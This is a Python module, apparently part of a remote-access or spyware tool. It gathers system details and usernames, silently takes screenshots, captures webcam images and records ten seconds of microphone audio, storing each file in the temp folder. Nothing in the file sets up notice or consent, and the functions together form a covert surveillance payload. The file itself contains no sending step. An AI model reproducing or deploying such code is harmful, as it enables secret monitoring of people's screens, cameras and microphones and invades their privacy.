import platform, os, getpass, subprocess
import pyautogui
import cv2
from datetime import datetime
import pyaudio, wave


'''
Returns the name of the operating system and the temporary folder's location
'''
def get_system_name_and_path():
	sys_name = platform.system().lower()
	temp_path = None

	if sys_name == 'windows':
		temp_path = f"C:/Users/{getpass.getuser()}/AppData/Local/Temp/"
	elif sys_name == 'linux' or sys_name == 'darwin':
		temp_path = "/tmp/"

	return (sys_name, temp_path)


'''
Gets the system information

@system_name: the name of the operating system (linux, windows, darwin(MacOS))
@return: list of 1 dict and 1 list
'''
def get_system_information(system_name):
	uname = {}
	uname["system"] = platform.uname().system
	uname["device_name"] = platform.uname().node
	uname["release"] = platform.uname().release
	uname["version"] = platform.uname().version
	uname["architecture"] = platform.uname().machine

	if system_name == 'windows':
		uname["processor"] = platform.uname().processor
	elif system_name == 'linux':
		all_info = subprocess.check_output('cat /proc/cpuinfo', shell=True).strip().decode()
		for line in all_info.split("\n"):
			if "model name" in line:
				uname["processor"] = line.split(':')[1].strip()
				break
	elif system_name == 'darwin':
		os.environ['PATH'] = os.environ['PATH'] + os.pathsep + '/usr/sbin'
		uname["processor"] = subprocess.check_output('sysctl -n machdep.cpu.brand_string').strip()

	info = [uname, [os.getlogin(), getpass.getuser()]]
	return info


'''
Gets current time

@return: time in dd/mm/yyyy | HH:MM:SS format
'''
def get_time():
	date_time = datetime.now().strftime("%d/%m/%Y | %H:%M:%S")
	return date_time


'''
Appends given data to the given file

@filename: path where to save the information
@data: writeble data into file
'''
def write_file(filename, data):
	with open(filename, "a+") as handler:
		handler.write(data[0] + ", " + data[1] + "\n")


'''
Takes screenshot which is saved into Temp folder on Windows systems or
tmp folder on linux/darwin systems

@save_path: path where to save the screenshot
@return: True if could have taken the screenshot otherwise False
'''
def take_screenshot(save_path):
	try:
		pyautogui.screenshot(os.path.join(save_path, "screenshot.png"))
	except Exception:
		return False
	return True


'''
Takes a picture with webcam if it exists

@save_path: path where to save the picture
@return: True if could have taken webcam picture otherwise False
'''
def take_webcam_picture(save_path):
	video_capture = cv2.VideoCapture(0)
	if video_capture.isOpened():
		rval, frame = video_capture.read()
		cv2.imwrite(os.path.join(save_path, "wc_picture.png"), frame)
		return True
	return False


'''
Records audio

@save_path: path where ro save the audio
@return: True if could have taken the audio record otherwise False
'''
def record_audio(save_path):
	chunk = 1024
	sample_format = pyaudio.paInt16 # 16 bits per sample
	channels = 2
	fs = 44100 # Record at 44100 samples per second
	seconds = 10

	pa = pyaudio.PyAudio()

	try:
		stream = pa.open(format=sample_format, channels=channels, rate=fs, frames_per_buffer=chunk, input=True)
		frames = []

		for i in range(0, int(fs / chunk * seconds)):
			data = stream.read(chunk)
			frames.append(data)

		stream.stop_stream()
		stream.close()
		pa.terminate()

		wf = wave.open(os.path.join(save_path, "rec_audio.wav"), 'wb')
		wf.setnchannels(channels)
		wf.setsampwidth(pa.get_sample_size(sample_format))
		wf.setframerate(fs)
		wf.writeframes(b''.join(frames))
		wf.close()
	except Exception:
		return False
	return True